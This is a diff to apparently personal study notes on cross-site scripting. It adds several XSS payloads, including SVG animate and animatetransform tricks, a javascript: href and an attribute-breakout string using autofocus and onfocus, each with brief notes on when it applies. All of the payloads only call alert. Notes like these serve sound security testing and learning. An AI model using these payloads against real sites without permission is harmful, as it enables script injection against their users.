@@ -12,6 +12,18 @@ Three Types Of XSS
 
 XSS Payloads
 
-Custom tag: <xss autofocus tabindex=1 onfocus=alert(1)></xss>
+-> Custom tag: <xss autofocus tabindex=1 onfocus=alert(1)></xss>
 
-<svg><animatetransform onbegin=alert(1) attributeName=transform>
+-> <svg><animatetransform onbegin=alert(1) attributeName=transform>
+
+-> By using "animate" tag, we can dynamically set attribute and values.
+Example payload: 
+<svg><a><animate attributeName="href" values="javascript:alert()"></animate> <text font-size="16" x="0" y="16">Click</text></a></svg>
+
+-> If we can terminate the attribute value but cannot escape the tag, we can use a payload similar to the following:
+
+ " autofocus onfocus=alert(document.domain) x="
+
+-> I have injected the above payload inside "input" tag and it worked.
+
+-> javascript:alert() payload is used when user supplied input is directly placed into href tag. 
